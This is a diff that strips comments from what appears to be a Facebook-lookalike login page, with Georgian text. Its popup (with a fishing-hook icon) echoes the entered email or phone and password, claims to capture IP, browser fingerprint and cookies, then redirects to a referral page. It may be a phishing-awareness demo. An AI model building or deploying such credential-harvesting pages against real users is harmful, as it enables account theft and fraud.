@@ -21,7 +21,6 @@
     justify-content: center;
   }
 
-  /* ─── MAIN WRAP ─── */
   .main-wrap {
     width: 100%;
     max-width: 396px;
@@ -31,7 +30,6 @@
     padding: 20px 16px 32px;
   }
 
-  /* LOGO */
   .fb-logo-wrap {
     display: flex; flex-direction: column; align-items: center;
     margin-bottom: 20px;
@@ -49,7 +47,6 @@
     letter-spacing: -1px;
   }
 
-  /* LOGIN BOX */
   .login-box {
     width: 100%;
     background: #fff;
@@ -101,7 +98,6 @@
     text-align: center;
   }
 
-  /* ─── POPUP ─── */
   .overlay {
     display: none; position: fixed; inset: 0;
     background: rgba(0,0,0,0.6);
@@ -154,7 +150,6 @@
   </div>
 </div>
 
-<!-- POPUP -->
 <div class="overlay" id="overlay">
   <div class="popup">
     <div class="icon">🎣</div>
@@ -197,7 +192,6 @@ function submitForm() {
     📧 ელ-ფოსტა/ტელეფონი: <strong>${e}</strong><br>
      🔑 პაროლი: <strong>${p}</strong><br>
      🌍 IP, Browser fingerprint, Cookies`;
-// redirect 1 წამში
   setTimeout(() => {
     window.location.href = "techshop-referral.html";
   }, 1000);
